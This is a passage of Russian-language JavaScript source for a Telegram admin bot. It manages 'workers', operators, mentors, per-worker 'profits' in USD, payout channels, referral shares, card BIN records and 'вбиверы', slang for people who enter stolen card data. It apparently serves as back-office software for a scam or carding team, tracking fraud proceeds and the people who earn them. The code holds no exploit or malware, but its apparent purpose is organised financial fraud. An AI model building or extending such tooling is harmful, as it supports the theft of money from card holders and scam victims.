  user.operator = operator.userId; // Сохраняем userId из таблицы Operators!
  await user.save();

  await log(
    ctx,
    isNew
      ? `назначил оператором @${operator.username} воркера @${user.username} (ID: ${user.id})`
      : `изменил оператора на @${operator.username} для воркера @${user.username} (ID: ${user.id})`
  );

  const messageToWorker = isNew
    ? `👨🏼‍💻 Вам назначен оператор: @${operator.username}`
    : `👨🏼‍💻 Ваш оператор был изменён на: @${operator.username}`;

  // ✅ Уведомление воркеру
  try {
    await ctx.telegram.sendMessage(user.id, messageToWorker, {
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("❌ Скрыть", "delete")],
      ]),
    });
  } catch (err) {
    console.error(`❌ Не удалось отправить сообщение воркеру:`, err);
  }

  // 🟡 Уведомление оператору
  const messageToOperator = isNew
    ? `👤 Вам назначен новый воркер: @${user.username} (ID: ${user.id})`
    : `👤 Вам назначен воркер: @${user.username} (ID: ${user.id}) (обновлено)`;

  try {
    await ctx.telegram.sendMessage(operator.userId, messageToOperator, {
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("❌ Скрыть", "delete")],
      ]),
    });
  } catch (err) {
    console.error(`❌ Не удалось отправить сообщение оператору:`, err);
  }

  await ctx.answerCbQuery("✅ Оператор успешно установлен.");
  return require("/root/bot/commands/admin/user")(ctx, userId); // Путь к профилю юзера
});

adminBot.action(/^admin_user_(\d+)_select_mentor$/, async (ctx) => {
  const userId = ctx.match[1];
  const mentors = await Nastavniki.findAll(); // Твоя таблица наставников

  if (!mentors.length) {
    return ctx.reply("❌ Наставники не найдены.");
  }

  // Формируем кнопки по 3 в ряд (без статусов)
  const buttons = mentors.reduce((acc, mentor, index) => {
    const button = Markup.callbackButton(
      `@${mentor.username}`,
      `admin_user_${userId}_set_mentor_${mentor.id}`
    );
    if (index % 3 === 0) acc.push([button]);
    else acc[acc.length - 1].push(button);
    return acc;
  }, []);

  buttons.push([
    Markup.callbackButton("◀️ Назад", `admin_user_${userId}_profile`),
  ]);

  await ctx.editMessageText("Выберите наставника:", {
    reply_markup: Markup.inlineKeyboard(buttons),
  });
});

adminBot.action(/^admin_user_(\d+)_set_mentor_(\d+)$/, async (ctx) => {
  const userId = ctx.match[1];
  const mentorId = ctx.match[2];

  const user = await User.findByPk(userId);
  const mentor = await Nastavniki.findByPk(mentorId); // Здесь используй свою модель Mentor

  if (!user || !mentor) {
    return ctx.reply("❌ Пользователь или наставник не найден.");
  }

  // Проверяем активность наставника
  if (!mentor.status) {
    return ctx.answerCbQuery("❌ Этот наставник сейчас оффлайн!", {
      show_alert: true,
    });
  }

  const isNew = !user.mentor;

  user.mentor = mentor.id;
  await user.save();

  await log(
    ctx,
    isNew
      ? `назначил наставником @${mentor.username} воркера @${user.username} (ID: ${user.id})`
      : `изменил наставника на @${mentor.username} для воркера @${user.username} (ID: ${user.id})`
  );

  const messageToWorker = isNew
    ? `🎓 Вам назначен наставник: @${mentor.username}`
    : `🎓 Ваш наставник был изменён на: @${mentor.username}`;

  try {
    await ctx.telegram.sendMessage(user.id, messageToWorker, {
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("❌ Скрыть", "delete")],
      ]),
    });

    // Уведомление наставнику
    await ctx.telegram.sendMessage(
      mentor.userId,
      `🆕 К вам прикреплён новый воркер: ID ${user.id} (@${user.username})`
    );
  } catch (err) {
    console.error(`❌ Не удалось отправить уведомление:`, err);
  }

  await ctx.answerCbQuery("✅ Наставник успешно установлен.");
  return require("/root/bot/commands/admin/user")(ctx, userId);
});
// 🎓 Наставники
adminBot.action("admin_mentors", async (ctx) => {
  try {
    const mentors = await Nastavniki.findAll({ where: { status: 1 } });

    // Формируем кнопки с учетом отсутствия username
    const buttons = mentors.reduce((acc, v, index) => {
      const mentorDisplay = v.username ? `@${v.username}` : `ID: ${v.id}`;
      const button = Markup.callbackButton(
        mentorDisplay,
        `admin_mentor_${v.id}`
      );
      if (index % 2 === 0) {
        acc.push([button]);
      } else {
        acc[acc.length - 1].push(button);
      }
      return acc;
    }, []);

    if (buttons.length === 0) {
      buttons.push([Markup.callbackButton("Страница пуста", "none")]);
    }

    const count = mentors.length;

    return ctx.replyOrEdit(`🎓 Список наставников (Всего: ${count})`, {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        ...buttons,
        [Markup.callbackButton("◀️ Назад", "admin")],
      ]),
    });
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

// 👨🏼‍💻 Операторы
adminBot.action("admin_operators", async (ctx) => {
  try {
    const operators = await Operators.findAll({
      where: { status: 1 },
      order: [["work", "DESC"]],
    });

    // Формируем кнопки с учетом отсутствия username
    const buttons = operators.reduce((acc, v, index) => {
      const operatorDisplay = v.username ? `@${v.username}` : `ID: ${v.id}`;
      const statusIcon = v.work == 1 ? "🟢" : "🔴";
      const button = Markup.callbackButton(
        `${statusIcon} ${operatorDisplay}`,
        `admin_operator_${v.id}`
      );
      if (index % 2 === 0) {
        acc.push([button]);
      } else {
        acc[acc.length - 1].push(button);
      }
      return acc;
    }, []);

    if (buttons.length === 0) {
      buttons.push([Markup.callbackButton("Страница пуста", "none")]);
    }

    const count = operators.length;

    return ctx.replyOrEdit(`👨🏼‍💻 Список операторов (Всего: ${count})`, {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        ...buttons,
        [Markup.callbackButton("◀️ Назад", "admin")],
      ]),
    });
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_operator_(\d+)$/, async (ctx) => {
  try {
    const operatorId = parseInt(ctx.match[1]);
    const operator = await Operators.findOne({
      where: { id: operatorId },
    });

    if (!operator) {
      return ctx.reply("❌ Оператор не найден.").catch((err) => err);
    }

    // Считаем профиты и воркеров
    const profitsCount = await Profit.count({
      where: { operator: operator.userId },
    });

    const amount = parseFloat(
      (await Profit.sum("amount", { where: { operator: operator.userId } })) ||
        0
    ).toFixed(2);

    const workersCount = await User.count({
      where: { operator: operator.userId },
    });

    const createdAt = operator.createdAt
      ? new Date(operator.createdAt).toLocaleDateString("ru-RU", {
          timeZone: "Europe/Moscow",
        })
      : "неизвестно";

    const operatorUsername = operator.username
      ? `@${operator.username}`
      : `ID: ${operator.id}`;

    return ctx.replyOrEdit(
      `👨🏼‍💻 <b>Оператор: ${operatorUsername}</b> ${
          operator.percent == null
            ? "(Процент не указан)"
            : `<b>${operator.percent}%</b>`
        }

<blockquote>
Кол-во профитов: <b>${profitsCount}</b>
Общая сумма профитов: <b>${amount} USD</b>
Количество воркеров: <b>${workersCount}</b>
Дата добавления: <b>${createdAt}</b>

Описание: <b>${operator.about || "не указано"}</b>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              operator.work
                ? "🔴 Переключить в оффлайн"
                : "🟢 Переключить в онлайн",
              `admin_toggleWork_${ctx.match[1]}`
            ),
          ],
          [
            Markup.callbackButton(
              "✏️ Изменить описание",
              `admin_editAbout1_${operatorId}`
            ),
            Markup.callbackButton(
              "💯 Изменить процент",
              `admin_editMentorPercent1_${operatorId}`
            ),
          ],
          [
            Markup.callbackButton(
              "👨‍🎓 Список воркеров",
              `admin_operator_students_${operatorId}_1`
            ),
          ],
          [
            Markup.callbackButton(
              "❌ Удалить оператора",
              `admin_deleteOperator_${operatorId}`
            ),
          ],
          [Markup.callbackButton("◀️ Назад", "admin_operators")],
        ]),
      }
    );
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_toggleWork_(\d+)$/, async (ctx) => {
  try {
    const operatorId = ctx.match[1];

    const operator = await Operators.findOne({
      where: { id: operatorId },
    });

    if (!operator) {
      return ctx.reply("❌ Оператор не найден");
    }

    // Переключаем статус
    operator.work = !operator.work;
    await operator.save();

    // Меняем только кнопки!
    const newKeyboard = Markup.inlineKeyboard([
      [
        Markup.callbackButton(
          operator.work
            ? "🔴 Переключить в оффлайн"
            : "🟢 Переключить в онлайн",
          `admin_toggleWork_${operator.id}`
        ),
      ],
      [
        Markup.callbackButton(
          "✏️ Изменить описание",
          `admin_editAbout1_${operatorId}`
        ),
        Markup.callbackButton(
          "💯 Изменить процент",
          `admin_editMentorPercent1_${operatorId}`
        ),
      ],
      [
        Markup.callbackButton(
          "👨‍🎓 Список воркеров",
          `admin_operator_students_${operatorId}_1`
        ),
      ],
      [
        Markup.callbackButton(
          "❌ Удалить оператора",
          `admin_deleteOperator_${operatorId}`
        ),
      ],
      [Markup.callbackButton("◀️ Назад", `admin_operators`)],
    ]);

    await ctx.editMessageReplyMarkup(newKeyboard);

    // Отправляем уведомление (можно убрать, если не хочешь всплывашки)
    await ctx.answerCbQuery(
      `✅ Статус изменён на ${operator.work ? "🟢 Онлайн" : "🔴 Оффлайн"}`
    );
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка при переключении статуса").catch((err) => err);
  }
});

adminBot.action(/^admin_manageOperator_(\d+)$/, async (ctx) => {
  try {
    const userId = parseInt(ctx.match[1], 10);
    const user = await User.findOne({ where: { id: userId } });

    // Проверка на случай отсутствия пользователя
    if (!user) {
      return ctx.reply("❌ Воркер не найден.").catch((err) => err);
    }

    const operatorId = user.operator;

    const operator = await Operators.findOne({
      where: { userId: operatorId },
    });

    if (!operator) {
      return ctx.reply("❌ Оператор не найден.").catch((err) => err);
    }

    const profitsCount = await Profit.count({
      where: {
        userId: userId,
      },
    });

    return ctx
      .replyOrEdit(
        `👨‍🎓 <b>Воркер:</b> @${user.username}
            
💰 Общее количество его профитов: <b>${profitsCount}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "❌ Удалить",
                `admin_deleteStudent1_${userId}`
              ),
            ],
            [
              Markup.callbackButton(
                "◀️ Назад",
                `admin_operator_students_${operator.id}_1`
              ),
            ],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_deleteStudent1_(\d+)$/, async (ctx) => {
  try {
    const userId = parseInt(ctx.match[1], 10);
    const user = await User.findOne({ where: { id: userId } });

    if (!user) {
      return ctx.reply("❌ Воркер не найден.").catch((err) => err);
    }

    const operator = await Operators.findOne({
      where: { userId: user.operator },
    });
    // Удаляем оператора у воркера
    await User.update({ operator: null }, { where: { id: userId } });

    return ctx
      .replyOrEdit("✅ Воркер удален", {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              "◀️ Назад",
              `admin_operator_students_${operator.id}_1`
            ),
          ],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_operator_students_(\d+)_(\d+)$/, async (ctx) => {
  try {
    const operatorId = parseInt(ctx.match[1], 10);
    const page = parseInt(ctx.match[2], 10) || 1;
    const limit = 30;
    const offset = (page - 1) * limit;

    const operator = await Operators.findOne({
      where: { id: operatorId },
    });

    if (!operator) {
      return ctx.reply("❌ Оператор не найден.");
    }

    const { count, rows } = await User.findAndCountAll({
      where: {
        operator: operator.userId,
      },
      limit,
      offset,
    });

    const buttons = rows.map((v) =>
      Markup.callbackButton(`@${v.username}`, `admin_manageOperator_${v.id}`)
    );

    const navigationButtons = [];

    // Кнопка "Назад"
    if (page > 1) {
      navigationButtons.push(
        Markup.callbackButton(
          "◀️ Назад",
          `admin_operator_students_${operatorId}_${page - 1}`
        )
      );
    }

    // Кнопка "Вперёд"
    if (offset + limit < count) {
      navigationButtons.push(
        Markup.callbackButton(
          "➡️ Вперёд",
          `admin_operator_students_${operatorId}_${page + 1}`
        )
      );
    }

    // Кнопка назад к оператору
    navigationButtons.push(
      Markup.callbackButton(
        "◀️ Назад к оператору",
        `admin_operator_${operatorId}`
      )
    );

    const replyMarkup = Markup.inlineKeyboard([
      ...chunk(buttons, 3),
      navigationButtons, // навигационные кнопки
    ]);

    return ctx.replyOrEdit(
      `👨‍🎓 Управление воркерами оператора @${operator.username} (Всего: ${count}) | Страница ${page}`,
      {
        parse_mode: "HTML",
        reply_markup: replyMarkup,
      }
    );
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка");
  }
});

adminBot.action(/^admin_deleteOperator_(\d+)$/, async (ctx) => {
  try {
    const operatorId = ctx.match[1];

    const operator = await Operators.findOne({
      where: { id: operatorId },
    });

    if (!operator) {
      return ctx.reply("❌ Оператор не найден.").catch((err) => err);
    }

    // Уведомление оператору
    try {
      await ctx.telegram.sendMessage(
        operator.userId,
        "<b>❌ Вы были удалены со списка операторов.</b>",
        { parse_mode: "HTML" }
      );
    } catch (err) {
      console.error(
        `Ошибка при отправке уведомления оператору: ${err.message}`
      );
    }

    // Удаляем из Operators
    await Operators.destroy({ where: { id: operatorId } });

    // Обновляем статус, isOperator и operator поле у пользователя
    await User.update(
      { isOperator: false },
      { where: { id: operator.userId } }
    );

    // Обновляем operator поле у других пользователей
    await User.update(
      { operator: null },
      { where: { operator: operator.userId } }
    );

    await ctx.answerCbQuery("✅ Оператор удалён!", true).catch((err) => err);

    return require("./commands/admin/admin")(ctx);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_editMentorPercent1_(\d+)$/, async (ctx) => {
  return ctx.scene.enter("admin_editMentorPercent1", {
    mentorId: ctx.match[1],
  });
});

adminBot.action(/^admin_editAbout1_(\d+)$/, async (ctx) => {
  return ctx.scene.enter("admin_editAbout1", {
    mentorId: ctx.match[1],
  });
});

adminBot.action(/^admin_bin_(\d+)_delete$/, async (ctx) => {
  try {
    const bin = await Bin.findByPk(ctx.match[1]);
    await bin.destroy();

    await ctx.answerCbQuery("✅ БИН удалён!", true).catch((err) => err);
    log(ctx, `удалил БИН <b>${bin.bin}</b>`);
    return bins(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action("admin_add_writer", (ctx) =>
  ctx.scene.enter("admin_add_writer")
);

adminBot.action("admin_add_teacher", (ctx) =>
  ctx.scene.enter("admin_add_teacher")
);

adminBot.action(/^admin_user_(\d+)_request_(\d+)$/, (ctx) =>
  request(ctx, ctx.match[2], ctx.match[1])
);

const handleRequestAction = async (ctx, requestId, userId = null, action) => {
  try {
    // Пытаемся найти с ассоциацией user
    let request_ = await Request.findByPk(requestId, {
      include: [{ association: "user", required: true }],
    });

    // Если не найдено, ищем без include
    let userData = null;
    if (!request_) {
      request_ = await Request.findByPk(requestId);
      if (!request_) {
        return ctx.answerCbQuery("❌ Заявка не найдена", true);
      } else {
        userData = { username: "неизвестен", id: "???" };
      }
    } else {
      userData = {
        username: request_.user.username,
        id: request_.user.id,
      };
    }

    // Меняем статус заявки
    const isAccepted = action === "accept";
    await request_.update({ status: isAccepted ? 1 : 2 });

    // Отправка сообщения пользователю
    await ctx.telegram
      .sendMessage(
        request_.userId,
        locale.requests[isAccepted ? "accepted" : "declined"],
        {
          parse_mode: "HTML",
          reply_markup: isAccepted
            ? Markup.inlineKeyboard([
                [
                  Markup.urlButton(
                    "💬 Чат воркеров",
                    ctx.state.bot.allGroupLink
                  ),

                  Markup.urlButton(
                    "📢 Канал выплат",
                    ctx.state.bot.payoutsChannelLink
                  ),
                ],
                [Markup.callbackButton("🤖 Меню", "start")],
              ])
            : {},
        }
      )
      .catch((err) => err);

    // Ответ в чате
    await ctx.answerCbQuery(
      isAccepted
        ? "✅ Вы успешно приняли заявку!"
        : "✅ Вы успешно отклонили заявку!",
      true
    );

    // Лог
    log(
      ctx,
      `${isAccepted ? "принял" : "отклонил"} заявку #${
        request_.id
      } пользователя <b><a href="tg://user?id=${request_.userId}">${
        userData.username
      }</a></b>`
    );

    // Обновление интерфейса
    return request(ctx, userId ? userId : requestId, userId);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
};
adminBot.action(/^admin_user_(\d+)_reset_refshare$/, async (ctx) => {
  try {
    const userId = ctx.match[1];

    const user = await User.findByPk(userId);
    if (!user) {
      return ctx.answerCbQuery("❌ Пользователь не найден", true);
    }

    const referrals = await Referral.findAll({ where: { referrerId: userId } });

    if (!referrals.length) {
      return ctx.answerCbQuery("❌ У пользователя нет реферальных записей", true);
    }

    const totalRefAmount = referrals.reduce(
      (sum, r) => sum + parseFloat(r.profitAmount || 0),
      0
    ).toFixed(2);

    // Обнуляем реферальные суммы
    await Referral.update(
      { profitAmount: 0 },
      { where: { referrerId: userId } }
    );

    await ctx.answerCbQuery("✅ Реферальная доля обнулена", { show_alert: true });

    // Уведомление пользователю
    await ctx.telegram.sendMessage(
      userId,
      `🚮 <b>Ваша реферальная доля была обнулена</b>\n\nОбщая сумма до сброса: <b>${totalRefAmount} USD</b>`,
      { parse_mode: "HTML", 
         reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("❌ Скрыть", "delete")],
      ]),}
    ).catch((err) => console.warn("❌ Не удалось отправить сообщение пользователю:", err.message));

    // 📘 Лог для админов
    log(
      ctx,
      `🚮 Обнулил реферальную долю пользователя <b><a href="tg://user?id=${user.id}">@${user.username}</a></b> на сумму <b>${totalRefAmount} USD</b>`
    );

    // Обновляем профиль
    return require("/root/bot/commands/admin/user")(ctx, userId);
  } catch (err) {
    console.error("❌ Ошибка при обнулении реф. доли:", err);
    return ctx.reply("❌ Ошибка при обнулении доли").catch(() => {});
  }
});

// Админ с привязкой к user
adminBot.action(
  /^admin_user_(\d+)_request_(\d+)_(accept|decline)$/,
  async (ctx) => {
    const userId = ctx.match[1];
    const requestId = ctx.match[2];
    const action = ctx.match[3];
    return handleRequestAction(ctx, requestId, userId, action);
  }
);

// Админ общий (без userId)
adminBot.action(/^admin_request_(\d+)_(accept|decline)$/, async (ctx) => {
  if (ctx.state.user.status !== 3 && ctx.state.user.status !== 1) return;

  const requestId = ctx.match[1];
  const action = ctx.match[2];
  return handleRequestAction(ctx, requestId, null, action);
});

adminBot.action(/^admin_mentor_(\d+)$/, async (ctx) => {
  try {
    const mentorId = parseInt(ctx.match[1]);
    const mentor = await Nastavniki.findOne({
      where: { id: mentorId },
    });

    if (!mentor) {
      return ctx.reply("❌ Наставник не найден.").catch((err) => err);
    }

    const profitsCount = await Profit.count({
      where: { mentor: mentor.id },
    });

    const amount = parseFloat(
      (await Profit.sum("amount", { where: { mentor: mentor.id } })) || 0
    ).toFixed(2);

    const studentsCount = await User.count({
      where: { mentor: mentor.id },
    });

    const createdAt = mentor.createdAt
      ? new Date(mentor.createdAt).toLocaleDateString("ru-RU", {
          timeZone: "Europe/Moscow",
        })
      : "неизвестно";

    const mentorUsername = mentor.username
      ? `@${mentor.username}`
      : `ID: ${mentor.id}`;

    return ctx.replyOrEdit(
      `🎓 <b>Наставник: ${mentorUsername}</b> ${
          mentor.percent == null
            ? "(Процент не указан)"
            : `<b>${mentor.percent}%</b>`
        }

<blockquote>
Кол-во профитов: <b>${profitsCount}</b>
Общая сумма профитов: <b>${amount} USD</b>
Количество учеников: <b>${studentsCount}</b>
Дата добавления: <b>${createdAt}</b>

Описание: <b>${mentor.about || "не указано"}</b>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              "✏️ Изменить описание",
              `admin_editAbout_${mentorId}`
            ),
            Markup.callbackButton(
              "💯 Изменить процент",
              `admin_editMentorPercent_${mentorId}`
            ),
          ],
          [
            Markup.callbackButton(
              "👨‍🎓 Список учеников",
              `admin_mentor_students_${mentorId}_1`
            ),
          ],
          [
            Markup.callbackButton(
              "❌ Удалить наставника",
              `admin_deleteMentor_${mentorId}`
            ),
          ],
          [Markup.callbackButton("◀️ Назад", "admin_mentors")],
        ]),
      }
    );
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_mentor_students_(\d+)_(\d+)$/, async (ctx) => {
  try {
    const mentorId = parseInt(ctx.match[1], 10);
    const page = parseInt(ctx.match[2], 10) || 1;
    const limit = 30; // Количество учеников на странице
    const offset = (page - 1) * limit;

    // Проверка наличия наставника
    const mentor = await Nastavniki.findOne({
      where: { id: mentorId },
    });

    if (!mentor) {
      return ctx.reply("❌ Наставник не найден.").catch((err) => err);
    }

    // Получаем учеников с пагинацией
    const { count, rows } = await User.findAndCountAll({
      where: { mentor: mentor.id },
      limit,
      offset,
    });

    // Кнопки учеников
    const buttons = rows.map((v) =>
      Markup.callbackButton(`@${v.username}`, `admin_manageMentor_${v.id}`)
    );

    // Навигация
    const navigationButtons = [];

    // Кнопка "◀️ Назад"
    if (page > 1) {
      navigationButtons.push(
        Markup.callbackButton(
          "◀️ Назад",
          `admin_mentor_students_${mentorId}_${page - 1}`
        )
      );
    }

    // Кнопка "➡️ Вперёд"
    if (offset + limit < count) {
      navigationButtons.push(
        Markup.callbackButton(
          "➡️ Вперёд",
          `admin_mentor_students_${mentorId}_${page + 1}`
        )
      );
    }

    // Кнопка назад к наставнику
    navigationButtons.push(
      Markup.callbackButton(
        "◀️ Назад к наставнику",
        `admin_mentor_${mentor.id}`
      )
    );

    // Формирование клавиатуры
    const replyMarkup = buttons.length
      ? Markup.inlineKeyboard([
          ...chunk(buttons, 3), // разбиваем по 3 в строке
          navigationButtons,
        ])
      : Markup.inlineKeyboard([
          [Markup.callbackButton("Страница пуста", "none")],
          [
            Markup.callbackButton(
              "◀️ Назад к наставнику",
              `admin_mentor_${mentor.id}`
            ),
          ],
        ]);

    // Отправляем сообщение
    return ctx
      .replyOrEdit(
        `👨‍🎓 Управление учениками наставника @${mentor.username} (Всего: ${count}) | Страница ${page}`,
        {
          parse_mode: "HTML",
          reply_markup: replyMarkup,
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_manageMentor_(\d+)$/, async (ctx) => {
  try {
    const userId = parseInt(ctx.match[1], 10);
    const user = await User.findOne({ where: { id: userId } });

    if (!user) {
      return ctx.reply("❌ Ученик не найден.").catch((err) => err);
    }

    const profitsCount = await Profit.count({
      where: { userId },
    });

    return ctx
      .replyOrEdit(
        `👨‍🎓 <b>Ученик:</b> @${user.username}

💰 Общее количество его профитов: <b>${profitsCount}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "❌ Удалить",
                `admin_deleteStudent_${userId}`
              ),
            ],
            [
              Markup.callbackButton(
                "◀️ Назад",
                `admin_mentor_students_${user.mentor}_1`
              ),
            ],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_deleteStudent_(\d+)$/, async (ctx) => {
  try {
    const userId = parseInt(ctx.match[1], 10);
    const user = await User.findOne({ where: { id: userId } });

    if (!user) {
      return ctx.reply("❌ Ученик не найден.").catch((err) => err);
    }

    // Проверяем, что у пользователя назначен наставник
    if (!user.mentor) {
      return ctx
        .reply("❌ Ученик не привязан к наставнику.")
        .catch((err) => err);
    }

    // Ищем наставника
    const mentor = await Nastavniki.findOne({
      where: { id: user.mentor },
    });

    if (!mentor) {
      return ctx.reply("❌ Наставник не найден.").catch((err) => err);
    }

    // Удаляем привязку ученика к наставнику
    await User.update({ mentor: null }, { where: { id: userId } });

    return ctx
      .replyOrEdit("✅ Ученик удален", {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              "◀️ Назад",
              `admin_mentor_students_${mentor.id}_1`
            ),
          ],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_editMentorPercent_(\d+)$/, async (ctx) => {
  return ctx.scene.enter("admin_editMentorPercent", {
    mentorId: ctx.match[1],
  });
});
adminBot.action(/^admin_editAbout_(\d+)$/, async (ctx) => {
  return ctx.scene.enter("admin_editAbout", {
    mentorId: ctx.match[1],
  });
});
adminBot.action(/^admin_deleteMentor_(\d+)$/, async (ctx) => {
  try {
    const mentorId = ctx.match[1];

    const mentor = await Nastavniki.findOne({
      where: { id: mentorId },
    });

    if (!mentor) {
      return ctx.reply("❌ Наставник не найден.").catch((err) => err);
    }

    // Уведомление наставнику
    try {
      await ctx.telegram.sendMessage(
        mentor.id,
        "<b>❌ Вы были удалены со списка наставников.</b>",
        { parse_mode: "HTML" }
      );
    } catch (err) {
      console.error(
        `Ошибка при отправке уведомления наставнику: ${err.message}`
      );
    }

    // Удаляем из Nastavniki
    await Nastavniki.destroy({ where: { id: mentorId } });

    // Обновляем статус, isMentor и mentor поле у пользователя
    await User.update({ isMentor: false }, { where: { id: mentorId } });

    // Обновляем mentor поле у других пользователей
    await User.update({ mentor: null }, { where: { mentor: mentor.username } });

    await ctx.answerCbQuery("✅ Наставник удалён!", true).catch((err) => err);

    return require("./commands/admin/admin")(ctx);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_request_(\d+)$/, (ctx) => request(ctx, ctx.match[1]));
adminBot.action(/^admin_writer_(\d+)$/, (ctx) => writer(ctx, ctx.match[1]));
adminBot.action(/^admin_writer_(\d+)_delete$/, async (ctx) => {
  try {
    const writerId = ctx.match[1];

    // Поиск записи в Writer
    const writerRecord = await Writer.findOne({
      where: {
        id: writerId,
      },
    });

    // Удаление записи из Writer
    await Writer.destroy({
      where: {
        id: writerId,
      },
    });

    // Если найден writerUserId, обновляем статус в User
    if (writerRecord && writerRecord.userId) {
      await User.update(
        { status: 0 },
        {
          where: {
            id: writerRecord.userId,
          },
        }
      );
    }

    await ctx
      .answerCbQuery("✅ Вбивер убран из списка, статус обновлён!", true)
      .catch((err) => err);

    return writers(ctx);
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_users_(\d+)$/, (ctx) => users(ctx, ctx.match[1]));
adminBot.action(/^admin_user_(\d+)$/, (ctx) => user(ctx, ctx.match[1]));
adminBot.action(/^admin_user_(\d+)_profile$/, (ctx) => user(ctx, ctx.match[1]));

adminBot.action(/^admin_user_(\d+)_profit_(\d+)_delete$/, async (ctx) => {
  try {
    const profit = await Profit.findByPk(ctx.match[2]);
    if (!profit) {
      await ctx.answerCbQuery("❌ Профит не найден", { show_alert: true });
      return;
    }

    // Удаление сообщений из каналов
    if (profit.channelMessageId) {
      await ctx.telegram
        .deleteMessage(ctx.state.bot.payoutsChannelId, profit.channelMessageId)
        .catch(() => null);
    }
    if (profit.chatMessageId) {
      await ctx.telegram
        .deleteMessage(ctx.state.bot.allGroupId, profit.chatMessageId)
        .catch(() => null);
    }

    await profit.destroy();

    await ctx.answerCbQuery("✅ Профит удален", { show_alert: true });

    log(
      ctx,
      `Удалил профит #${profit.id} суммой ${profit.amount} ${profit.currency}`
    );
    return userProfits(ctx, ctx.match[1], 1);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch(() => null);
  }
});

adminBot.action(/^admin_profit_(\d+)_delete$/, async (ctx) => {
  try {
    const profit = await Profit.findByPk(ctx.match[1]);
    if (!profit) {
      await ctx.answerCbQuery("❌ Профит не найден", { show_alert: true });
      return;
    }

    // Удаление сообщений из каналов
    if (profit.channelMessageId) {
      await ctx.telegram
        .deleteMessage(ctx.state.bot.payoutsChannelId, profit.channelMessageId)
        .catch(() => null);
    }
    if (profit.chatMessageId) {
      await ctx.telegram
        .deleteMessage(ctx.state.bot.allGroupId, profit.chatMessageId)
        .catch(() => null);
    }

    await profit.destroy();

    await ctx.answerCbQuery("✅ Профит удален", { show_alert: true });

    log(
      ctx,
      `Удалил профит #${profit.id} суммой ${profit.amount} ${profit.currency}`
    );
    return profits(ctx);
  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Ошибка").catch(() => null);
  }
});
adminBot.action(
  /^profitAdmin_user_(\d+)_profit_(\d+)_set_status_(wait|payed|razvitie|lok)$/,
  async (ctx) => {
    try {
      const profit_ = await Profit.findByPk(ctx.match[2]);
      await profit_.update({
        status: {
          wait: 0,
          payed: 1,
          razvitie: 2,
          lok: 3,
        }[ctx.match[3]],
      });
      await ctx.telegram
        .editMessageReplyMarkup(
          ctx.state.bot.payoutsChannelId,
          profit_.channelMessageId,
          profit_.channelMessageId,
          Markup.inlineKeyboard([
            [Markup.callbackButton(locale.newProfit[ctx.match[3]], "none")],
          ])
        )
        .catch((err) => err);

      await ctx
        .answerCbQuery("✅ Статус профита изменен", true)
        .catch((err) => err);
      return await ctx
        .editMessageReplyMarkup(
          Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                `Статус профита: ${locale.newProfit[ctx.match[3]]}`,
                `none`
              ),
            ],
            [
              Markup.callbackButton(
                "👤 Перейти к пользователю",
                `admin_user_${profit_.userId}`
              ),
            ],
            [
              Markup.callbackButton(
                "✍️ Перейти к вбиверу",
                `admin_user_${profit_.writerId}`
              ),
            ],
            [
              Markup.callbackButton(
                locale.newProfit.payed,
                `profitAdmin_${
                  profit_.userId ? `user_${profit_.userId}_` : ""
                }profit_${profit_.id}_set_status_payed`
              ),

              Markup.callbackButton(
                locale.newProfit.lok,
                `profitAdmin_${
                  profit_.userId ? `user_${profit_.userId}_` : ""
                }profit_${profit_.id}_set_status_lok`
              ),
            ],
            [
              Markup.callbackButton(
                locale.newProfit.razvitie,
                `profitAdmin_${
                  profit_.userId ? `user_${profit_.userId}_` : ""
